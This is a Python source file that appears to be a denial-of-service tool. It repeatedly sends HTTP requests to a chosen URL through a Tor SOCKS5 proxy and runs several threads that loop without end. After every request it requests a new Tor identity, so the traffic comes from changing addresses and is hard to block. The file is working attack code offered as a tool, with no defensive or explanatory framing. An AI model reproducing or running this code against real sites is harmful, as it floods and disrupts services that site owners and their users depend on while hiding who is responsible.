from threading import Thread

from asyncio import unix_events, set_event_loop, new_event_loop

from aiohttp import ClientSession

from aiohttp_socks import ProxyType, ProxyConnector

from stem.control import Controller

from stem import Signal

from argparse import Namespace


URL = 'https://ident.me'

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
    'Connection:': 'keep-alive',
    'Cache-Control': 'no-cache, no-store, must-revalidate',
    'Pragma': 'no-cache',
    'Expires': '0'
}

PROXY_HOST = 'localhost'

PROXY_PORT = 9050

WORKERS = 8


async def dos(url: str, proxy_host: str, proxy_port: str):
    # Proxy
    connector = ProxyConnector(
        proxy_type=ProxyType.SOCKS5,
        host=proxy_host,
        port=proxy_port,
        # DNS resolution for Socket
        rdns=True
    )

    # HTTP session
    session = ClientSession(connector=connector)

    try:
        async with session.get(url, headers=HEADERS) as response:
            print(f'Request status code {response.status}')
    except Exception as error:
        print(str(error))

    await session.close()

    # TOR new identity
    with Controller.from_port(port=9051) as controller:
        controller.authenticate()

        controller.signal(Signal.NEWNYM)


async def dos_looper(url: str, proxy_host: str, proxy_port: str):
    while True:
        await dos(
            url=url,
            proxy_host=proxy_host,
            proxy_port=proxy_port,
        )


def runner(args: Namespace, loop: unix_events._UnixSelectorEventLoop):
    set_event_loop(loop)

    loop.create_task(dos_looper(args.url, args.proxy_host, args.proxy_port))

    loop.run_forever()


def pool(args: Namespace):
    for worker in range(args.workers):
        loop = new_event_loop()

        thread = Thread(target=runner, args=(args, loop))

        thread.start()
